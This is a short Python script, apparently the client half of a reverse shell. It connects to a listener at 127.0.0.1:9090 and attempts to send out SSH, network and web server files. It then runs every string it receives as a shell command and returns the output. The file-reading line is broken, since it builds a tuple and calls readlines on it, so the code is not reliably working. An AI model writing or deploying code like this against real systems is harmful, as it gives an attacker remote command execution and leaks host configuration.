import socket
import os
import subprocess

s = socket.socket()
host = '127.0.0.1'
port = 9090


s.connect((host, port))


while True:
    arq = open('/etc/ssh/sshd_config', 'rb'),('/etc/network/interfaces', 'rb'),('/var/www/html/index.html', 'rb')

    for i in arq.readlines():
        s.send(i)

    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte,"utf-8")
        currentWD = os.getcwd() + "> "
        s.send(str.encode(output_str + currentWD))

        print(output_str)
